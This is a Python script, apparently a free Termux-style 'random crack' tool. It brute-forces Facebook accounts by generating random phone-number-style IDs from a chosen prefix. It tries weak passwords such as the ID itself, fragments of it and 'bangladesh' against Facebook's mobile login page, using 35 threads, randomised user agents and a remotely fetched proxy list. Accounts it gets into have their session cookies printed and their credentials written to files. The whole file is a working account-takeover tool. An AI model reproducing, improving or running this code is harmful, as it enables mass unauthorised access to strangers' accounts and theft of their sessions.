import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
os.system("espeak -a 50 \"welcome,sir,working,Wi-Fi\"")
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []

#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mBDS')
prox=open('.prox.txt','r').read().splitlines()

for sum in range(10000):
          a='Mozilla/5.0 (Linux; Android'
          b=random.choice(['9','8','0','7','0','10','11','12','13','14','15'])
          c='SM-J730G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
          d=random.randrange(40,150)
          e='0'
          f=random.randrange(5000,10000)
          g=random.randrange(40,200)
          h='Safari/537.36'
          ua=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
          ugen.append(ua)
          


        
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;93m[\033[1;93m√\033[1;93m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;93m[\033[1;93m√\033[1;93m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username =='MAHAFUZ' and password == 'KING':
        print(' \033[0;93mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
os.system("espeak -a 70 \"follow,my Facebook,--ID\"")
os.system(f'xdg-open https://www.facebook.com/1kingmahafuz ')
logo = ("""       
            \033[1;32m      Assalamu Alaikum
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
 \033[1;32m   __  __    _    _   _    _    _____ _   _ _____
   |  \/  |  / \  | | | |  / \  |  ___| | | |__  /
   | |\/| | / _ \ | |_| | / _ \ | |_  | | | | / / 
\033[1;33m   | |  | |/ ___ \|  _  |/ ___ \|  _| | |_| |/ /_ 
   |_|  |_/_/   \_\_| |_/_/   \_\_|    \___//____|                                    
                                     
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
  \033[1;32m
~~~|{>}DEVELOPER          : MD:MAHAFUZ RAHMAN
~~~|{>}Facebook           : MAHAFUZ ROHMAN
~~~|{>}Github             : MAHAFUZ-CYBER-51
~~~|{>}Version            : 0.1
~~~|{>}Tool               : Free 

\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
   """)
logo1 = ("""
\033[1;32m      Assalamu Alaikum
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
 \033[1;32m   __  __    _    _   _    _    _____ _   _ _____
   |  \/  |  / \  | | | |  / \  |  ___| | | |__  /
   | |\/| | / _ \ | |_| | / _ \ | |_  | | | | / / 
\033[1;33m   | |  | |/ ___ \|  _  |/ ___ \|  _| | |_| |/ /_ 
   |_|  |_/_/   \_\_| |_/_/   \_\_|    \___//____|                                    
                                     
\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ 
  \033[1;32m
~~~|{>}DEVELOPER          : MD:MAHAFUZ RAHMAN
~~~|{>}Facebook           : MAHAFUZ ROHMAN
~~~|{>}Github             : MAHAFUZ-CYBER-51
~~~|{>}Version            : 0.1
~~~|{>}Tool               : Free 

\033[1;31m⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖═꫞══⚀●☆●☆●⚀══꫞═⭖═꫞══⚀●☆●☆●⚀══꫞═⭖ ⭖ """)

def mumitx():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)
        print('---------------')
        print(" \033[38;5;46m[1]RANDOM CRACK")
        print("\033[1;95m [0] Exit")
        print('---------------')
        Mumit =input("\n [?] Choices : ")
        if Mumit in ["1"]:
            fuck()
        if Mumit in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[38;5;46m[+] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[38;5;46m[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=35) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[1;92m[+] Total ids: '+tl)
        print("[+] Your Code: "+code)
        print('[+] Process has been started')
        print('[+] Use flight mode for speed up')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print('==================================================')
    print('\033[1;93m [+] Crack process has been completed')
    print(' [+] OK Ids saved in MAHAFUZ/OK.txt')
    print(' [+] CP Ids saved in MAHAFUZ/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[38;5;46m[MR~MAHAFUZ]--[%s/%s]--[CP%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method':'GET',
    'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '3',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X6833B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'user-agent': pro,}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mMR-MAHAFUZ-OK-☺️\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                os.system('espeak -a 300 "Congratulations. ok id"')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ-🤩- : \033[1;35m'+coki)
                open('/sdcard/mahafuz-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[MR-MAHAFUZ-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/mahafuz-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
Main()
